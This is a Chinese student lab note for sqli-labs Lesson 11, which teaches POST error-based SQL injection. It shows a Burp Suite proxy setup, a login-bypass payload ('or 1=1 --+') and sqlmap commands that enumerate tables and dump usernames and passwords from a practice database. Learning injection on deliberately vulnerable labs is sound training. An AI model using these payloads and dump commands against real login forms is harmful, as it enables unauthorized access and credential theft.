# Lab11 -- Error Baesd -String

## Burpsuite 安装和使用

+ Burpsuite是一款Web安全测试软件，但是需要java环境，安装JDK然后设置环境变量
  + 截断代理设置 -- 在浏览器中设置局域网代理，默认是127.0.0.1，端口8080，为了监听端口进行抓取HTTP消息
  + 主机搭建sqli-labs网站，虚拟机kali中进行sql注入

+ 安装：Kali自带免费版本Burpsuite（后面简写为BS）

## POST基于错误单引号注入

+ 与GET的区别：注入点位置发生变化，浏览器中无法直接进行查看与修改

+ 打开BS拦截，随便输入账号和密码

  + BS拦截到后，在action-->repeater（快捷键CTRL+R），然后在左边requests构造出错语句 -- 在passwd后面加一个'
  + 根据报错信息猜测sql语句

  ```
  select * from table where uname='uname' and passwd='passwd' LIMIT 0,1
  ```

  + 于是构造万能密码

  ```
  万能密码：uname=admin&passwd=123' or 1=1 --+
  于是：select * from table where uname='admin' and passwd='passwd' or 1=1 --+ 'LIMIT 0,1
  后面的LIMIT0，1也被省略了
  ```

  

# SQLMAP使用

+ 把BS拦截到的请求复制到一个txt（这里是`target.txt`文件中并复制到sqlmap文件夹下

-r 后面跟请求txt路径

-p 后面跟要注入的查询点

这里我们知道是基于报错的注入所以可以后面加

--technique E(Error)

```
python sqlmap.py -r target.txt -p passwd --technique E
```

接着很快结果就出来啦	上面数据库版本服务器版本全出来了

+ 查询结果所在的数据库库

--current-db

```

```

+ 查询所在数据库的字段名

-D security --tables

得到此数据库下的数据表们

+ 指定一个表进行爆表

-D security -T users --columns

探测出此表的字段们

+ 指定一个字段进行爆数据

-D security -T users -C "username,password" --dump

+ [x] --dump是啥意思？ -- `倾倒`具体数据的意思





## 一些坑

+ 主机端是windows10，搭建phpstudy-sqli-labs环境，然后在主机端用burpsuite抓包死活抓不到本地的包，无奈了
+ 于是打开虚拟机来访问主机的sqli-labs，一开始在宿舍做的实验，用手机热点连的笔记本，然后虚拟机访问主机的sqli-labs完全ojkb
+ 后来有一次要做笔记，在一个社区做的实验，连了社区的wifi，此时，奇怪的是，虚拟机再也访问不了主机的sqli-labs环境了，我都无语了
+ 彩蛋 -- 发现了火狐浏览器的调试器里其实有跟burpsuit类似的功能，拦截到包而且可以编辑重发！！！！如下图

![11_1](.\images\11_1.png)

![11_2](.\images\11_2.png)